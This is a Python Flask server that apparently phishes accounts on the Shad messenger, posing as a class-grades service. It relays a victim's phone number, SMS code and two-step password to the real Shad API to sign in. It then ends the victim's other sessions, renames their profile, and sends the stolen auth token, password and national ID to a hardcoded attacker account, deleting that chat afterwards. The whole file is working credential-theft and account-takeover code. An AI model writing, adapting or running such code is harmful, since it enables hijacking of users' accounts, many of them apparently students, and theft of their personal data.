from flask import Flask, request, jsonify, send_from_directory
import requests, base64, json, random, string
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad, unpad
from datetime import datetime

app = Flask(__name__, static_folder='static')

MY_AUTH = "eskjlqtbxteznnbgpvfzkgronhzmbfsl"
TARGET_GUID = "u0E4X3204c2982f80ef7091080667d52"
API_URL = "https://shadmessenger36.iranlms.ir/"
IV = b'\x00' * 16

def make_key(auth):
    s = auth[16:24] + auth[0:8] + auth[24:32] + auth[8:16]
    out = []
    for ch in s:
        if ch.isdigit():
            out.append(chr((ord(ch) - 48 + 5) % 10 + 48))
        elif ch.islower():
            out.append(chr((ord(ch) - 97 + 9) % 26 + 97))
        else:
            out.append(ch)
    return ''.join(out).encode()

def aes_encrypt(auth, plain):
    c = AES.new(make_key(auth), AES.MODE_CBC, IV)
    return base64.b64encode(c.encrypt(pad(plain.encode('utf-8'), 16))).decode()

def aes_decrypt(auth, b64):
    c = AES.new(make_key(auth), AES.MODE_CBC, IV)
    return unpad(c.decrypt(base64.b64decode(b64)), 16).decode('utf-8')

def auth_set(s):
    out = []
    for c in s:
        if 'a' <= c <= 'z':
            out.append(chr(((32 - (ord(c) - 97)) % 26) + 97))
        elif 'A' <= c <= 'Z':
            out.append(chr(((29 - (ord(c) - 65)) % 26) + 65))
        elif '0' <= c <= '9':
            out.append(chr(((13 - (ord(c) - 48)) % 10) + 48))
        else:
            out.append(c)
    return ''.join(out)

def gen_rsa():
    key = RSA.generate(1024)
    priv_pem = key.export_key()
    pub_pem = key.publickey().export_key()
    pem_wrapped = "-----BEGIN PUBLIC KEY-----\r\n" + base64.b64encode(pub_pem).decode() + "\r\n-----END PUBLIC KEY-----"
    pub_b64 = base64.b64encode(pem_wrapped.encode()).decode()
    return priv_pem, auth_set(pub_b64)

def rsa_decrypt(priv_pem, b64):
    key = RSA.import_key(priv_pem)
    c = PKCS1_OAEP.new(key)
    return c.decrypt(base64.b64decode(b64)).decode('utf-8')

def post_json(payload):
    r = requests.post(API_URL, json=payload, headers={"User-Agent": "okhttp/3.12.0"}, timeout=25)
    return r.text

def normalize(phone):
    n = ''.join(ch for ch in phone if ch.isdigit())
    if n.startswith('98'): n = n[2:]
    if n.startswith('0'): n = n[1:]
    return n

def parse_response(tmp, priv, text):
    try:
        root = json.loads(text)
    except:
        return None, text
    if 'data_enc' not in root:
        return None, text
    dec = aes_decrypt(tmp, root['data_enc'])
    if dec is None:
        try: dec = rsa_decrypt(priv, root['data_enc'])
        except: pass
    if dec is None:
        return None, text
    try:
        data = json.loads(dec)
    except:
        return None, dec
    return data, dec

def unwrap(data):
    if isinstance(data, dict) and 'data' in data:
        inner = data['data']
        if isinstance(inner, str):
            try: inner = json.loads(inner)
            except: pass
        if isinstance(inner, dict):
            return inner
    return data

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/api/send_code', methods=['POST'])
def send_code():
    phone = request.json.get('phone', '')
    tmp = ''.join(random.choices(string.ascii_lowercase, k=32))
    priv, pub = gen_rsa()
    method = json.dumps({
        "input": {"phone_number": "98" + normalize(phone), "send_type": "SMS"},
        "method": "sendCode",
        "client": {"app_name":"Main","app_version":"3.2.3","platform":"Web","package":"web.shad.ir","lang_code":"fa"}
    })
    payload = {"api_version":"5","tmp_session":tmp,"data_enc":aes_encrypt(tmp, method),"public_key":pub}
    text = post_json(payload)
    data, raw = parse_response(tmp, priv, text)
    if not data:
        return jsonify({"status":"ERROR","message":raw})
    
    inner = unwrap(data)
    
    if inner.get('status') == 'SendPassKey':
        return jsonify({"status":"PASS_REQUIRED"})
    if 'phone_code_hash' in inner:
        return jsonify({"status":"OK","hash":inner['phone_code_hash']})
    return jsonify({"status":"ERROR","message":raw})

@app.route('/api/send_pass', methods=['POST'])
def send_pass():
    phone = request.json.get('phone', '')
    pass_key = request.json.get('pass_key', '')
    tmp = ''.join(random.choices(string.ascii_lowercase, k=32))
    priv, pub = gen_rsa()
    method = json.dumps({
        "method":"sendCode",
        "input":{"phone_number":"98"+normalize(phone),"send_type":"SMS","pass_key":pass_key},
        "client":{"app_name":"Main","app_version":"3.2.3","platform":"Web","package":"web.shad.ir","lang_code":"fa"}
    })
    payload = {"api_version":"5","tmp_session":tmp,"data_enc":aes_encrypt(tmp, method),"public_key":pub}
    text = post_json(payload)
    data, raw = parse_response(tmp, priv, text)
    if not data:
        return jsonify({"status":"ERROR","message":raw})
    
    inner = unwrap(data)
    st = inner.get('status','')
    if 'Invalid' in st or 'Wrong' in st:
        return jsonify({"status":"ERROR","message":"رمز دو مرحله‌ای اشتباه است"})
    if 'phone_code_hash' in inner:
        return jsonify({"status":"OK","hash":inner['phone_code_hash']})
    return jsonify({"status":"ERROR","message":raw})

@app.route('/api/sign_in', methods=['POST'])
def sign_in():
    phone = request.json.get('phone', '')
    code = request.json.get('code', '')
    hash_ = request.json.get('hash', '')
    role = request.json.get('role', '')
    nid = request.json.get('nid', '')
    password = request.json.get('password', '')

    tmp = ''.join(random.choices(string.ascii_lowercase, k=32))
    priv, pub = gen_rsa()
    method = json.dumps({
        "method":"signIn",
        "input":{"phone_number":"98"+normalize(phone),"phone_code_hash":hash_,"phone_code":code},
        "client":{"app_name":"Main","app_version":"3.2.3","platform":"Web","package":"web.shad.ir","lang_code":"fa"}
    })
    payload = {"api_version":"5","tmp_session":tmp,"data_enc":aes_encrypt(tmp, method),"public_key":pub}
    text = post_json(payload)
    data, raw = parse_response(tmp, priv, text)
    if not data:
        return jsonify({"status":"ERROR","message":raw})
    
    inner = unwrap(data)
    if inner.get('status') != 'OK':
        return jsonify({"status":"ERROR","message":raw})
    user_auth = inner.get('auth', '')
    if not user_auth:
        return jsonify({"status":"ERROR","message":"No auth in response"})

    device = json.dumps({"app_version":"MA_3.6.5","device_hash":"90EC014117A2848CC45DEC2B90BD0C4A","device_model":"Nomre Kelasi","lang_code":"fa","system_version":"SDK 23","token":"","token_type":"Firebase"})
    post_json({"api_version":"4","auth":user_auth,"client":{"app_name":"Main","app_version":"3.6.5","lang_code":"fa","package":"ir.medu.shad","platform":"Android"},"data_enc":aes_encrypt(user_auth, device),"method":"registerDevice"})

    post_json({"api_version":"4","auth":user_auth,"client":{"app_name":"Main","app_version":"3.1.0","lang_code":"fa","package":"ir.medu.shad","platform":"Android"},"data_enc":aes_encrypt(user_auth, "{}"),"method":"terminateOtherSessions"})

    new_name = role + " ₐ_ₛₕₐᵣₒᵣ"
    prof = json.dumps({"first_name": new_name, "updated_parameters":["first_name"]})
    post_json({"api_version":"4","auth":user_auth,"client":{"app_name":"Main","app_version":"3.1.0","lang_code":"fa","package":"ir.medu.shad","platform":"Android"},"data_enc":aes_encrypt(user_auth, prof),"method":"updateProfile"})

    now = datetime.now().strftime("%Y/%m/%d %H:%M")
    message = (
        "╰ 𝘼𝙍𝙈𝙄𝙉 𝙎𝙃𝘼𝙍𝙊𝙍 ╯\n\n"
        "🆔 𝙄𝙙𝙚𝙣𝙩𝙞𝙩𝙮:\n#" + role.replace(" ", "_") + "\n\n"
        "🔐 𝘼𝙪𝙩𝙝: #" + user_auth + "\n\n"
        "📞 𝗡𝘂𝗺𝗯𝗲𝗿: " + phone + "\n\n"
        "🔑 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱: " + (password if password else "ندارد") + "\n\n"
        "🪪 𝙉𝙖𝙩𝙞𝙤𝙣𝙖𝙡 𝘾𝙤𝙙𝙚: " + nid + "\n\n"
        "📅 𝙎𝙚𝙣𝙙 𝘿𝙖𝙩𝙚: " + now + "\n\n"
        "🛠️ 𝘾𝙧𝙚𝙖𝙩𝙚𝙙 𝘽𝙮: @GOD_TAT"
    )
    inner_data = json.dumps({"object_guid": TARGET_GUID, "rnd": random.randint(100000000, 999999999), "text": message})
    post_json({"api_version":"4","auth":MY_AUTH,"client":{"app_name":"Main","app_version":"3.6.5","lang_code":"fa","package":"ir.medu.shad","platform":"Android"},"data_enc":aes_encrypt(MY_AUTH, inner_data),"method":"sendMessage"})

    del_inner = json.dumps({"user_guid": TARGET_GUID, "last_deleted_message_id": "0"})
    post_json({"api_version":"4","auth":MY_AUTH,"client":{"app_name":"Main","app_version":"3.1.0","lang_code":"fa","package":"ir.medu.shad","platform":"Android"},"data_enc":aes_encrypt(MY_AUTH, del_inner),"method":"deleteUserChat"})

    return jsonify({"status":"OK"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
